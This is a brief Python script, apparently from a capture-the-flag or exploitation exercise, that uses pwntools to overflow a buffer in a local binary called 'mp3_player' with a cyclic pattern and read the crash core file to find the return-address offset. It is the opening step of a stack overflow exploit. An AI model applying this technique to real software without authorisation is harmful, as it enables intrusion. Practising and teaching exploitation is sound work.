from pwn import *

elf = ELF("./mp3_player", checksec=False)
p = elf.process()

# Overflow the buffer
p.recvuntil(b"ABBA")
p.sendline(cyclic(150))
p.wait()

# Read corefile to get RIP offset
core = p.corefile
offset = cyclic_find(core.read(core.rsp, 4))
print(offset)
